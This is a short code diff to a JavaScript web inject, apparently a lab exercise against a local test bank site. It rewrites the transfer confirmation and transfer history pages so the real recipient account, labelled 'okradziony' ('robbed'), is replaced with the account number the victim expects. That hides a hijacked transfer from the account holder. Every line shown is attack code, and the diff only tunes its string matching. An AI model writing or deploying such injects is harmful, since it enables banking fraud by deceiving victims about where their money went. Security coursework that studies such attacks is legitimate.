@@ -24,7 +24,7 @@ if (form.attachEvent) {
 if(document.location.href=='http://127.0.0.1:8000/bank/przelew/confirm'){
 	ps=document.getElementsByTagName('p')
 	p=ps[1]
-	if(p.innerText==='okradziony'){
+	if(p.innerText==="Rachunek: : okradziony\n"){
   p.innerText="Rachunek: "+localStorage.getItem('nrRachunku')+"\n"
 	}
 }
@@ -34,7 +34,7 @@ if(document.location.href=='http://127.0.0.1:8000/bank/przelew/all'){
 	for(var i=0;i<ps.length;i++){
 		p=ps[i].getElementsByTagName('th')[1]
 		if(p.innerText==='okradziony'){
-			p.innerText='okradnij'
+			p.innerText='kradnij'
 		}
 	}
 
